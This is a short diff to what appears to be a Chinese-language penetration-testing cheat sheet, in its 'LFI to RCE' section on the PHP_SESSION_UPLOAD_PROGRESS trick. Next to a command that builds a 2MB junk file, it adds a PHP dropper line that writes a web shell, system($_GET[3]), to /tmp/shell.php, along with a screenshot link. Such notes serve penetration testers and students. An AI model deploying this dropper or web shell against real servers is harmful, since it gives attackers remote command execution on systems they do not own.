@@ -191,6 +191,8 @@ LFI to RCE
 
 PHP_SESSION_UPLOAD_PROGRESS
 ---
-    創建一個塞滿垃圾的檔案
+    創建一個塞滿垃圾的檔案和要塞進去tmp的shell
     python -c 'print "A" * 2048 * 1024' >> junk.txt
+    evildropper:<?php file_put_contents('/tmp/shell.php','<?php system($_GET[3])?>'); ?>
 <img  alt="image" src="https://github.com/user-attachments/assets/91179427-5665-4ce2-98ae-a3fafea3d966">
+<img  alt="image" src="https://github.com/user-attachments/assets/8ba98314-7dee-4646-a85f-69c53597d65a">
